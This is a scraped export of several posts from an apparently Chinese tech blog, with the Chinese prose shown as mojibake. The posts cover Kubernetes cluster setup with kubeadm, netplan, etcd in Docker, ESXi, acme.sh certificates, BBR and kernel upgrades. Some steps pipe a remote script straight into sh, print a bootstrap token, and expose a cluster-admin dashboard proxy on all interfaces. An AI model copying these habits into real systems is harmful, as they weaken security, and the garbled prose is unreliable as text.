é€Ÿä¸‹è½½\nhttp://mirrors.163.com/ubuntu-releases/18.04/ubuntu-18.04-live-server-amd64.iso\nåœ¨3å°ä¸»æœºä¸Šå®‰è£…ç³»ç»Ÿ ç‰©ç†æœºæˆ–è€…è™šæ‹Ÿæœºéƒ½å¯ä»¥ï¼Œè¦æ±‚äº’ç›¸ä¹‹å‰å¯ä»¥ç›´è¿ï¼Œå†…å­˜å»ºè®®åœ¨2Gä»¥ä¸Šï¼Œ å¦‚æœä¸è·‘ä»€ä¹ˆå¤§å‹ç³»ç»Ÿçš„è¯ç¡¬ç›˜15Gå°±å·®ä¸å¤šäº†\nè¿™é‡Œç›´æ¥åœ¨VMware Esxi ä¸Šå¯åŠ¨3ä¸ªå®ä¾‹å®‰è£…ç³»ç»Ÿå¹¶æŒ‡å®šIPåœ°å€\nä¸»æœº IP hostname è¯´æ˜ c-1 192.168.5.191 c1 Master c-2 192.168.5.192 c2 Node c-3 192.168.5.193 c3 Node å‡†å¤‡ç¯å¢ƒ ä¸‹é¢çš„æ­¥éª¤éœ€è¦åœ¨3å°ä¸»æœºä¸Šå…¨éƒ¨æ‰§è¡Œ, æ³¨æ„ä½¿ç”¨rootç”¨æˆ·\n(å¯é€‰) æ›´æ¢aptçš„æ›´æ–°æºä¸ºå›½å†…çš„åœ°å€ï¼ŒåŠ é€Ÿå®‰è£…è¿‡ç¨‹ sed -i -- 's/archive.ubuntu.com/mirrors.163.com/g' /etc/apt/sources.list\næ›´æ–° APT apt update -y \u0026amp;\u0026amp; apt upgrade -y\nå®‰è£… Docker CE ä»¥ä¸‹å¯ä»¥å‚ç…§Docker å®˜ç½‘çš„æ–‡æ¡£ https://docs.docker.com/install/linux/docker-ce/ubuntu/\n# å®‰è£…ä¾èµ– apt-get install -y \\ apt-transport-https \\ ca-certificates \\ curl \\ software-properties-common # Add Dockerâ€™s official GPG key: curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - # æ·»åŠ Docker çš„ apt repository. add-apt-repository \\ \u0026#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\u0026#34; # æ›´æ–°APT å¹¶å®‰è£…Docker apt-get update -y \u0026amp;\u0026amp; apt-get install -y docker-ce å®‰è£… Kubernetes ç›¸å…³çš„å·¥å…· # Add Googleâ€™s official GPG key: curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add - # æ·»åŠ  APT repository. cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/apt/sources.list.d/kubernetes.list deb http://apt.kubernetes.io/ kubernetes-xenial main EOF # æ›´æ–°APT å¹¶å®‰è£… apt-get update -y \u0026amp;\u0026amp; apt-get install -y kubelet kubeadm kubectl åˆ°è¿™é‡ŒåŸºç¡€ç¯å¢ƒå°±å‡†å¤‡å¥½äº†ï¼Œ ä¸‹æ¥å¼€å§‹åˆå§‹åŒ–ï¼Œ æ³¨æ„ä¸‹é¢çš„éƒ¨åˆ†åœ¨Masterä¸»æœºä¸Šæ“ä½œ\nåˆå§‹åŒ– Kubernetes å¯åŠ¨ Master (å¯é€‰) å…ˆpullä¸€ä¸‹åˆå§‹åŒ–è¿‡ç¨‹ä¸­éœ€è¦çš„docker imageï¼Œ åŠ é€Ÿå®‰è£…è¿‡ç¨‹ kubeadm config images pull\nåˆå§‹åŒ– kubeadm init --pod-network-cidr=10.244.0.0/16\npod-network-cidrå‚æ•°æ˜¯ä¹‹ååˆ›å»ºå†…éƒ¨ç½‘ç»œéœ€è¦çš„ipæ®µï¼Œé€‰ä¸€ä¸ªæ²¡æœ‰è¢«å ç”¨çš„å†…ç½‘æ®µå°±å¯ä»¥äº†\nå¦‚æœæŠ¥é”™ if [ERROR Swap]: running with swap on is not supported. Please disable swap\nswap æ²¡æœ‰å…³é—­ï¼Œ ä½¿ç”¨swapoff -aå‘½ä»¤å…³é—­swapå†é‡æ–°è¿è¡Œinit\nè¾“å‡ºå¤§æ¦‚å¦‚ä¸‹\nroot@c1:/home/tian# kubeadm init --pod-network-cidr=10.244.0.0/16 I0711 03:45:48.345918 2359 feature_gate.go:230] feature gates: \u0026amp;{map[]} [init] using Kubernetes version: v1.11.0 [preflight] running pre-flight checks I0711 03:45:48.367074 2359 kernel_validator.go:81] Validating kernel version I0711 03:45:48.367165 2359 kernel_validator.go:96] Validating kernel config [WARNING SystemVerification]: docker version is greater than the most recently validated version. Docker version: 18.03.1-ce. Max validated version: 17.03 [preflight/images] Pulling images required for setting up a Kubernetes cluster [preflight/images] This might take a minute or two, depending on the speed of your internet connection [preflight/images] You can also perform this action in beforehand using \u0026#39;kubeadm config images pull\u0026#39; [kubelet] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [preflight] Activating the kubelet service [certificates] Generated ca certificate and key. [certificates] Generated apiserver certificate and key. [certificates] apiserver serving cert is signed for DNS names [c1 kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.96.0.1 192.168.5.191] [certificates] Generated apiserver-kubelet-client certificate and key. [certificates] Generated sa key and public key. [certificates] Generated front-proxy-ca certificate and key. [certificates] Generated front-proxy-client certificate and key. [certificates] Generated etcd/ca certificate and key. [certificates] Generated etcd/server certificate and key. [certificates] etcd/server serving cert is signed for DNS names [c1 localhost] and IPs [127.0.0.1 ::1] [certificates] Generated etcd/peer certificate and key. [certificates] etcd/peer serving cert is signed for DNS names [c1 localhost] and IPs [192.168.5.191 127.0.0.1 ::1] [certificates] Generated etcd/healthcheck-client certificate and key. [certificates] Generated apiserver-etcd-client certificate and key. [certificates] valid certificates and keys now exist in \u0026#34;/etc/kubernetes/pki\u0026#34; [kubeconfig] Wrote KubeConfig file to disk: \u0026#34;/etc/kubernetes/admin.conf\u0026#34; [kubeconfig] Wrote KubeConfig file to disk: \u0026#34;/etc/kubernetes/kubelet.conf\u0026#34; [kubeconfig] Wrote KubeConfig file to disk: \u0026#34;/etc/kubernetes/controller-manager.conf\u0026#34; [kubeconfig] Wrote KubeConfig file to disk: \u0026#34;/etc/kubernetes/scheduler.conf\u0026#34; [controlplane] wrote Static Pod manifest for component kube-apiserver to \u0026#34;/etc/kubernetes/manifests/kube-apiserver.yaml\u0026#34; [controlplane] wrote Static Pod manifest for component kube-controller-manager to \u0026#34;/etc/kubernetes/manifests/kube-controller-manager.yaml\u0026#34; [controlplane] wrote Static Pod manifest for component kube-scheduler to \u0026#34;/etc/kubernetes/manifests/kube-scheduler.yaml\u0026#34; [etcd] Wrote Static Pod manifest for a local etcd instance to \u0026#34;/etc/kubernetes/manifests/etcd.yaml\u0026#34; [init] waiting for the kubelet to boot up the control plane as Static Pods from directory \u0026#34;/etc/kubernetes/manifests\u0026#34; [init] this might take a minute or longer if the control plane images have to be pulled [apiclient] All control plane components are healthy after 42.004178 seconds [uploadconfig] storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace [kubelet] Creating a ConfigMap \u0026#34;kubelet-config-1.11\u0026#34; in namespace kube-system with the configuration for the kubelets in the cluster [markmaster] Marking the node c1 as master by adding the label \u0026#34;node-role.kubernetes.io/master=\u0026#39;\u0026#39;\u0026#34; [markmaster] Marking the node c1 as master by adding the taints [node-role.kubernetes.io/master:NoSchedule] [patchnode] Uploading the CRI Socket information \u0026#34;/var/run/dockershim.sock\u0026#34; to the Node API object \u0026#34;c1\u0026#34; as an annotation [bootstraptoken] using token: pbl4c9.b0ws1tfhjt6ra66a [bootstraptoken] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials [bootstraptoken] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token [bootstraptoken] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster [bootstraptoken] creating the \u0026#34;cluster-info\u0026#34; ConfigMap in the \u0026#34;kube-public\u0026#34; namespace [addons] Applied essential addon: CoreDNS [addons] Applied essential addon: kube-proxy Your Kubernetes master has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ You can now join any number of machines by running the following on each node as root: kubeadm join 192.168.5.191:6443 --token xxxxxxxxxxx --discovery-token-ca-cert-hash sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx é…ç½®ä¿¡æ¯æ‹·è´åˆ°æ™®é€šç”¨æˆ· ä¸Šé¢æœ‰ä¸¤éƒ¨åˆ†æ˜¯ä¹‹åéœ€è¦ç”¨åˆ°çš„ã€‚\né¦–å…ˆé€€å‡ºrootç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸€æ®µï¼Œç›®çš„æ˜¯å°†ç”Ÿæˆçš„ç›¸å…³é…ç½®ä¿¡æ¯æ‹·è´åˆ°æ™®é€šç”¨æˆ·ç›®å½•ä¸‹ï¼Œä¹‹åç›´æ¥ä½¿ç”¨æ™®é€šç”¨æˆ·æ“ä½œé›†ç¾¤\nmkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config æ£€æŸ¥ä¸€ä¸‹èŠ‚ç‚¹ä¿¡æ¯\nkubectl get nodes --all-namespaces\ntian@c1:~$ kubectl get nodes --all-namespaces NAME STATUS ROLES AGE VERSION c1 NotReady master 1m v1.11.0 å› ä¸ºç½‘ç»œè¿˜æ²¡æœ‰é…ç½®å¥½ï¼Œ çŠ¶æ€è¿˜æš‚æ—¶æ˜¯NotReadyï¼Œ ä¸‹æ¥å®‰è£…ç½‘ç»œæ’ä»¶\nå®‰è£…ç½‘ç»œæ’ä»¶ é€‰æ‹©ä¸€ç§ç½‘ç»œæ’ä»¶ï¼Œ å‚è€ƒå®˜æ–¹æ–‡æ¡£https://kubernetes.io/docs/setup/independent/create-cluster-kubeadm/#pod-network\næˆ‘ä»¬è¿™é‡Œä½¿ç”¨Flannel\næ‰§è¡Œ (For Kubernetes v1.7+)\nkubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml\næ³¨æ„æ–°ç‰ˆæœ¬çš„ubuntu éœ€è¦æ›´æ”¹ /etc/sysctl.conf æ·»åŠ  net.bridge.bridge-nf-call-iptables=1 å¼€å¯æ¡¥æ¥ç½‘ç»œçš„æµé‡è½¬å‘\necho \u0026#39;net.bridge.bridge-nf-call-iptables=1\u0026#39; \u0026gt;\u0026gt; /etc/sysctl.conf sysctl -p å®‰è£…å®Œæˆåä½¿ç”¨kubectl get pods --all-namespacesçœ‹ä¸‹æƒ…å†µï¼Œ å› ä¸ºè¦ä¸‹è½½ç›¸å…³çš„dockeré•œåƒï¼Œå¯èƒ½éœ€è¦ä¸€ç‚¹æ—¶é—´ï¼Œç­‰åˆ°kube-flannel-XXXXXXX è¿™ä¸ªå˜æˆRunning ä¹‹åå°±å®Œæˆäº†\ntian@c1:~$ kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE kube-system coredns-78fcdf6894-8tkzx 1/1 Running 0 2m kube-system coredns-78fcdf6894-cbdb8 1/1 Running 0 2m kube-system etcd-c1 1/1 Running 0 1m kube-system kube-apiserver-c1 1/1 Running 0 1m kube-system kube-controller-manager-c1 1/1 Running 0 2m kube-system kube-flannel-ds-pqpgk 1/1 Running 0 36s kube-system kube-proxy-kpjrk 1/1 Running 0 2m kube-system kube-scheduler-c1 1/1 Running 0 1m åˆ°è¿™é‡ŒMasterå°±é…ç½®å¥½äº†ï¼Œç°åœ¨å¯ä»¥å¼€å§‹åŠ å…¥å…¶å®ƒèŠ‚ç‚¹äº†\nåˆå§‹åŒ–å…¶å®ƒ Node è¿›å…¥å…¶å®ƒçš„æ‰€æœ‰ä¸»æœºåˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œ æ‰§è¡Œä¹‹å‰Materåˆå§‹åŒ–æœ€åè¾“å‡ºçš„joinå‘½ä»¤æ®µï¼Œ ä¾‹å¦‚\nkubeadm join 192.168.5.191:6443 --token xxxxxxxxxxx --discovery-token-ca-cert-hash sha256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\nå¦‚æœæ²¡æœ‰æŠ¥é”™çš„è¯å°±å®Œæˆäº†\næ¥ä¸‹æ¥å›åˆ°Masterä¸»æœº\nä½¿ç”¨kubectl get nodesæŸ¥çœ‹èŠ‚ç‚¹çš„çŠ¶æ€\ntian@c1:~$ kubectl get nodes NAME STATUS ROLES AGE VERSION c1 Ready master 10m v1.11.0 c2 NotReady \u0026lt;none\u0026gt; 1m v1.11.0 c3 NotReady \u0026lt;none\u0026gt; 14s v1.11.0 åˆ°è¿™é‡Œå°±å®Œæˆäº†ï¼Œç¨ç­‰åˆå§‹åŒ–å®Œæˆå¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚\nå®‰è£…å›¾å½¢åŒ–ç®¡ç†ç•Œé¢ å®‰è£… kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.1/aio/deploy/recommended.yaml #å¼€å¯proxy æ–¹ä¾¿å†…ç½‘è®¿é—® kubectl proxy --address=\u0026#39;0.0.0.0\u0026#39; #(å¯é€‰)å¦‚æœåœ¨æœºæˆ¿å†…ç½‘éœ€è¦ç»è¿‡gatewayæ‰èƒ½è®¿é—®çš„è¯ï¼Œ å¯ä»¥ä¸´æ—¶å¼€å¯sshè½¬å‘ï¼Œç„¶åç›´æ¥è®¿é—® TMac :: ~ Â» ssh -L localhost:8001:192.168.5.191:8001 gateway-server ç®¡ç†åœ°å€\nhttp://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/\næ¥ä¸‹æ¥è¦åˆ›å»ºå¯ä»¥ç™»é™†ç®¡ç†ç•Œé¢çš„ç”¨æˆ·\nåˆ›å»ºç”¨æˆ·é…ç½® create_account.yaml, ç”¨æˆ·åä¸ºadmin\napiVersion: v1 kind: ServiceAccount metadata: name: admin-user namespace: kubernetes-dashboard åº”ç”¨é…ç½®kubectl create -f create_account.yaml\nåˆ›å»ºæƒé™é…ç½® admin_account_role_binding.yaml\napiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: admin-user roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard åº”ç”¨é…ç½®kubectl create -f admin_account_role_binding.yaml\nå¥½äº†ï¼Œ æ¥ä¸‹æ¥æŸ¥çœ‹åˆ›å»ºçš„ç”¨æˆ·token\nkubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk '{print $1}')\nä½¿ç”¨è¾“å‡ºçš„å¾ˆé•¿å¾ˆé•¿çš„tokenç™»é™†\né”€æ¯ æ³¨æ„ï¼Œè¿™é‡Œæ˜¯é”€æ¯\nç§»é™¤Node åœ¨Mater ä¸Šæ‰§è¡Œ\nkubectl drain \u0026lt;node name\u0026gt; --delete-local-data --force --ignore-daemonsets kubectl delete node \u0026lt;node name\u0026gt; ç„¶ååœ¨å¯¹åº”çš„Node ä¸Šæ‰§è¡Œkubeadm reset\nåˆ é™¤Master ç›´æ¥æ‰§è¡Œ kubeadm reset å°±å¯ä»¥äº†\nå…¨æ–‡å®Œ\n","date":"2018-07-12T00:00:00Z","permalink":"https://hitian.info/post/kubernetes-cluster-setup-on-ubuntu-server/","title":"åœ¨Ubuntu Serverä¸Šæ­å»ºKubernetes cluster"},{"content":"æœ€æ–°çš„ubuntuå·²ç»ä½¿ç”¨netplanæ¥ç®¡ç†ç½‘ç»œé…ç½®äº†\nåˆ—å‡ºå½“å‰çš„é…ç½®æ–‡ä»¶ls -al /etc/netplan/ï¼Œ æ³¨æ„é…ç½®æ–‡ä»¶ä¸ºyamlæ ¼å¼ï¼Œ å¦‚æœå½“å‰æ²¡æœ‰é…ç½®ï¼Œ å¯ä»¥åˆ›å»ºä¸€ä¸ªä¾‹å¦‚/etc/netplan/01-netcfg.yaml\nä¾‹å­ é…ç½®ä¸ºä½¿ç”¨DHCP network: version: 2 renderer: networkd ethernets: ens33: dhcp4: yes dhcp6: yes é…ç½®ä¸ºé™æ€ip network: version: 2 renderer: networkd ethernets: ens33: dhcp4: no dhcp6: no addresses: [192.168.1.2/24] gateway4: 192.168.1.1 nameservers: addresses: [8.8.8.8,8.8.4.4] é…ç½®æ–‡ä»¶ä¿®æ”¹å¥½ä¹‹åä½¿ç”¨sudo netplan applyåº”ç”¨é…ç½®ï¼Œ å¯ä»¥åŠ debugå‚æ•°æ¥æŸ¥çœ‹å…·ä½“çš„è¿‡ç¨‹sudo netplan --debug apply\n","date":"2018-07-10T00:00:00Z","permalink":"https://hitian.info/post/ubuntu-server-set-network-netplan/","title":"ä½¿ç”¨netplanç®¡ç†ubuntu çš„ç½‘ç»œé…ç½®"},{"content":"OmniFocus change language Reset omnifocus:///change-preference?AppleLanguages= ä¸­æ–‡ omnifocus:///change-preference?AppleLanguages=zh Bear Create note bear://x-callback-url/create?title=Title\u0026amp;text=Text\u0026amp;tags=tag1,tag2 Open tag bear://x-callback-url/open-tag?name=tag-name Search note bear://x-callback-url/search?term=keyword Due Add due://x-callback-url/add?title=title ","date":"2018-07-09T00:00:00Z","permalink":"https://hitian.info/post/x-callback-links/","title":"å¸¸ç”¨çš„ x-callback é“¾æ¥"},{"content":"docker host ip addr 192.168.5.170\ndocker run \\ -p 2379:2379 \\ -p 2380:2380 \\ --volume=/dir/for/etcd/data:/etcd-data \\ --name etcd --rm -d quay.io/coreos/etcd:latest \\ /usr/local/bin/etcd \\ --data-dir=/etcd-data --name node1 \\ --initial-advertise-peer-urls http://192.168.5.170:2380 \\ --listen-peer-urls http://0.0.0.0:2380 \\ --advertise-client-urls http://192.168.5.170:2379 \\ --listen-client-urls http://0.0.0.0:2379 \\ --initial-cluster node1=http://192.168.5.170:2380 with tls certificate.\ndocker run --name etcd -d -p 2379:2379 -p 2380:2380 \\ -v /home/tian/workspace/certs:/etcd-ssl-certs-dir \\ -v /home/tian/workspace/etcd:/etcd-data \\ quay.io/coreos/etcd:latest /usr/local/bin/etcd \\ --name my-name \\ --data-dir /etcd-data \\ --listen-client-urls \u0026#34;https://0.0.0.0:2379\u0026#34; \\ --advertise-client-urls \u0026#34;https://hostname:2379\u0026#34; \\ --listen-peer-urls \u0026#34;https://0.0.0.0:2380\u0026#34; \\ --initial-advertise-peer-urls \u0026#34;https://hostname:2380\u0026#34; \\ --initial-cluster \u0026#34;my-name=https://hostname:2380\u0026#34; \\ --initial-cluster-token \u0026#34;tkn\u0026#34; \\ --initial-cluster-state \u0026#34;new\u0026#34; \\ --client-cert-auth \\ --trusted-ca-file \u0026#34;/etcd-ssl-certs-dir/ca.pem\u0026#34; \\ --cert-file \u0026#34;/etcd-ssl-certs-dir/server.pem\u0026#34; \\ --key-file \u0026#34;/etcd-ssl-certs-dir/server-key.pem\u0026#34; \\ --peer-client-cert-auth \\ --peer-trusted-ca-file \u0026#34;/etcd-ssl-certs-dir/ca.pem\u0026#34; \\ --peer-cert-file \u0026#34;/etcd-ssl-certs-dir/server.pem\u0026#34; \\ --peer-key-file \u0026#34;/etcd-ssl-certs-dir/server-key.pem\u0026#34; check\ndocker exec -it etcd etcdctl member list test with golang\n{% gist 211bd79f3ce5a6e1fde607086a75c46b %}\ncreate golang client with certificate.\n//load client certificate. cert, err := tls.LoadX509KeyPair(\u0026#34;./client.pem\u0026#34;, \u0026#34;./client-key.pem\u0026#34;) if err != nil { panic(err) } //load ca certificate. rootCAPem, err := ioutil.ReadFile(\u0026#34;ca.pem\u0026#34;) if err != nil { panic(err) } caPool := x509.NewCertPool() ok := caPool.AppendCertsFromPEM(rootCAPem) if !ok { panic(\u0026#34;append ca cert failed.\u0026#34;) } cfg := client.Config{ Endpoints: []string{\u0026#34;https://hostname:2379\u0026#34;}, Transport: \u0026amp;http.Transport{ TLSClientConfig: \u0026amp;tls.Config{ Certificates: []tls.Certificate{cert}, RootCAs: caPool, }, }, HeaderTimeoutPerRequest: time.Second, } ","date":"2018-07-08T00:00:00Z","permalink":"https://hitian.info/post/docker-run-etcd/","title":"Deploying an etcd cluster as a standalone cluster on docker"},{"content":"*** ä»¥ä¸‹å†…å®¹é’ˆå¯¹ VMware ESXi 6.5.0 build-6765664 ***\næ„å¤–åˆ é™¤äº†esxi çš„ä¸€ä¸ªvmfsæ‰€åœ¨çš„ç£ç›˜ï¼Œå¯¼è‡´vmåˆ—è¡¨ä¸‹ä¸€ç›´ä¼šæ˜¾ç¤ºä¸€ä¸ªinvalidçŠ¶æ€çš„VMï¼Œ æ— æ³•è¿›è¡Œä»»ä½•æ“ä½œï¼Œçœ‹ç€éå¸¸ç¢çœ¼ã€‚æ˜¾ç„¶é€šè¿‡webç•Œé¢å¯èƒ½æ— æ³•å¤„ç†è¿™ä¸ªé—®é¢˜äº†\nå¼€å¯SSHæœåŠ¡ï¼Œç™»å½•esxiã€‚\n[root@localhost:/vmfs] vim-cmd vmsvc/getallvms Skipping invalid VM \u0026#39;6\u0026#39; Vmid Name File Guest OS Version Annotation 1 ubuntu-desktop [HDD] ubuntu-desktop/ubuntu-desktop.vmx ubuntu64Guest vmx-13 11 ubuntu-server-1710 [HDD] ubuntu-server-1710/ubuntu-server-1710.vmx ubuntu64Guest vmx-13 2 ubuntu-server [HDD] ubuntu-server/ubuntu-server.vmx ubuntu64Guest vmx-13 3 windows-7 [HDD] windows-7/windows-7.vmx windows7_64Guest vmx-13 ä½¿ç”¨ vim-cmd vmsvc/getallvms å‘½ä»¤å¯ä»¥çœ‹åˆ°æç¤ºå‡ºç°é—®é¢˜çš„æ˜¯ VM 6ï¼Œ æ¥ä¸‹æ¥ç›´æ¥åˆ é™¤å°±å¥½äº†ã€‚\n[root@localhost:/vmfs] vim-cmd vmsvc/unregister 6 åˆ·æ–°webç•Œé¢ï¼Œ å°±å¯ä»¥çœ‹åˆ°å‡ºé”™çš„vmå·²ç»è¢«åˆ é™¤äº†ã€‚\n","date":"2017-11-05T00:00:00Z","permalink":"https://hitian.info/post/esxi-unregister-invalid-vm/","title":"vmware esxi unregister invalid vm"},{"content":"å®‰è£… acme.sh curl https://get.acme.sh | sh å‚è€ƒ https://github.com/Neilpang/acme.sh\nå®‰è£…å®Œæˆä¹‹åå¯æ‰§è¡Œæ–‡ä»¶ä½äº ~/.acme.sh/acme.sh\nç”Ÿæˆ dnspod çš„API Token åœ°å€ https://www.dnspod.cn/console/user/security\nç”¨æˆ·ä¸­å¿ƒ \u0026gt; å®‰å…¨è®¾ç½® \u0026gt; API Token \u0026gt; åˆ›å»º API Token\næ³¨æ„ï¼ŒToken åªæ˜¾ç¤ºä¸€æ¬¡ï¼Œ ä¿å­˜ä¸‹æ¥ï¼Œ å¦‚æœå¿˜è®°äº†ï¼Œ å°±åªèƒ½åˆ é™¤ç„¶åé‡æ–°ç”Ÿæˆäº†ã€‚\nè¿˜éœ€éœ€è¦è®°å½•ä¸‹ API Token çš„ ID\nå¼€å§‹ç­¾å‘è¯ä¹¦ å‚è€ƒ https://github.com/Neilpang/acme.sh/tree/master/dnsapi\né¦–å…ˆè®¾ç½®ç¯å¢ƒå˜é‡\nexport DP_Id=\u0026#34;API Token çš„ ID\u0026#34; export DP_Key=\u0026#34;API Token\u0026#34; ç„¶åå¯ä»¥å¼€å§‹ç­¾å‘äº†\nacme.sh --issue --dns dns_dp -d example.com -d www.example.com æ¯ä¸ª -d å‚æ•°å¯ä»¥æŒ‡å®šä¸€ä¸ªåŸŸåï¼Œ å¯ä»¥æŠŠéœ€è¦ç”¨åˆ°çš„å­åŸŸåä¹Ÿå…¨éƒ¨åˆ—å‡ºæ¥\nè‡ªåŠ¨è¿è¡Œçš„æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·çš„\nä½¿ç”¨dnspodçš„api è‡ªåŠ¨ç”Ÿæˆæ‰€æœ‰çš„éªŒè¯åŸŸåtxtè®°å½• _acme-challenge.example.comï¼Œ æ¯ä¸ªå­åŸŸåä¹Ÿä¼šæœ‰_acme-challenge.www.example.com ç­‰å¾…dnsè®°å½•ç”Ÿæ•ˆï¼Œè‡ªåŠ¨è„šæœ¬ä¼šsleep 120 ç§’ æ£€æŸ¥éªŒè¯çš„dnsè®°å½•ï¼Œ æ²¡æœ‰é—®é¢˜çš„è¯ç­¾å‘è¯ä¹¦ä¿å­˜åˆ°æœ¬åœ°ï¼Œ å†æ¬¡è°ƒç”¨api ç§»é™¤éªŒè¯çš„åŸŸå åˆ›å»ºcrontab è‡ªåŠ¨æ›´æ–°ç›¸å…³è¯ä¹¦ã€‚ ç”Ÿæˆå¥½çš„è¯ä¹¦ä½äº ~/.acme.sh/www.example.com ç›®å½•ä¸‹, è‡³æ­¤è¯ä¹¦å°±ç­¾å‘å¥½äº†ã€‚\nå¦å¤–è‡ªåŠ¨åˆ›å»ºçš„ crontab\n24 0 * * * \u0026quot;/home/tian/.acme.sh\u0026quot;/acme.sh --cron --home \u0026quot;/home/tian/.acme.sh\u0026quot; \u0026gt; /dev/null\nåº”è¯¥ä¼šæ¯å¤©è¿è¡Œä¸€æ¬¡ï¼Œ åœ¨è¯ä¹¦è¿‡æœŸå‰è‡ªåŠ¨æ›´æ–°ã€‚\n","date":"2017-02-16T00:00:00Z","permalink":"https://hitian.info/post/acme-sh-create-letsencrypt-certificates-with-dns-api/","title":"ä½¿ç”¨ACME Shell scriptå’Œdnspodçš„apiè‡ªåŠ¨ç”ŸæˆLet's Encryptè¯ä¹¦"},{"content":"é¦–å…ˆéœ€è¦æ›´æ–°åˆ°4.9ä»¥ä¸Šçš„å†…æ ¸ç‰ˆæœ¬ï¼Œ ubuntuå’Œdebianå¯ä»¥å‚è€ƒ è¿™é‡Œ\né‡å¯ç¡®è®¤å†…æ ¸ç‰ˆæœ¬å‡çº§å®Œæˆç»§ç»­\nä»¥rootç”¨æˆ·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤\necho \u0026#34;net.core.default_qdisc=fq\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf echo \u0026#34;net.ipv4.tcp_congestion_control=bbr\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf sysctl -p æ£€æŸ¥æ˜¯å¦ä¿®æ”¹æˆåŠŸ\nsysctl net.ipv4.tcp_available_congestion_control #ç»“æœå¦‚ä¸‹ï¼Œ åŒ…å«bbr #net.ipv4.tcp_available_congestion_control = bbr cubic reno lsmod | grep bbr #ç»“æœå¦‚ä¸‹ï¼Œ åŒ…å« tcp_bbr #tcp_bbr 20480 40 ","date":"2017-02-07T00:00:00Z","permalink":"https://hitian.info/post/ubuntu-server-install-bbr/","title":"Ubuntu Server Install BBR"},{"content":"ä¸‹è½½æœ€æ–°çš„å†…æ ¸ http://kernel.ubuntu.com/~kernel-ppa/mainline/?C=N;O=D\nè¿›å…¥æœ€æ–°çš„ç‰ˆæœ¬ç›®å½•\néœ€è¦ä¸‹è½½4ä¸ªæ–‡ä»¶\nlinux-headers-XXXXX_XXXXX_all.deb linux-headers-XXXXX-generic_XXXXX_PLATFORM.deb linux-image-unsigned-XXXXX-generic_XXXXX_PLATFORM.deb linux-modules-XXXXX-generic_XXXXX_PLATFORM.deb ä¾‹å¦‚ç›®å‰æœ€æ–°çš„æ˜¯v4.17.5 (2018-07-09), ä¸‹è½½è¿™4ä¸ªæ–‡ä»¶\nlinux-headers-4.17.5-041705_4.17.5-041705.201807081431_all.deb linux-headers-4.17.5-041705-generic_4.17.5-041705.201807081431_amd64.deb linux-image-unsigned-4.17.5-041705-generic_4.17.5-041705.201807081431_amd64.deb linux-modules-4.17.5-041705-generic_4.17.5-041705.201807081431_amd64.deb å®‰è£… dpkg -i *.deb å¦‚æœå®‰è£…æŠ¥é”™æç¤ºlibssl1.1æ²¡æœ‰å®‰è£…\nUnpacking openssl (1.1.0g-2ubuntu5) over (1.0.2g-1ubuntu4.13) ... dpkg: dependency problems prevent configuration of openssl: openssl depends on libssl1.1 (\u0026gt;= 1.1.0); however: Package libssl1.1 is not installed. dpkg: error processing package openssl (--install): dependency problems - leaving unconfigured å¯ä»¥ä»http://security.ubuntu.com/ubuntu/pool/main/o/openssl/ ä¸‹è½½å®‰è£…\næ³¨æ„: å¦‚æœä½¿ç”¨çš„æ˜¯linodeï¼Œ è¿˜éœ€è¦åœ¨åå°è°ƒæ•´ Configuration Profile \u0026gt; Boot Settings \u0026gt; Kernel ä¸º GRUB 2 æ‰èƒ½å¯åŠ¨åˆ°æ›´æ–°åçš„å†…æ ¸ã€‚\nå®‰è£…å®Œæˆåé‡å¯ä¸€ä¸‹ ç¡®è®¤ä¸€ä¸‹å†…æ ¸æ˜¯å¦å‡çº§æˆåŠŸ\nuname -a ","date":"2017-02-07T00:00:00Z","permalink":"https://hitian.info/post/ubuntu-server-install-mainline-kernel/","title":"Ubuntu Server Install Mainline Kernel"},{"content":"è¿™å‡ å¤©åœ¨è¯•ç”¨Google Cloud Platformï¼Œè§‰å¾—Compute 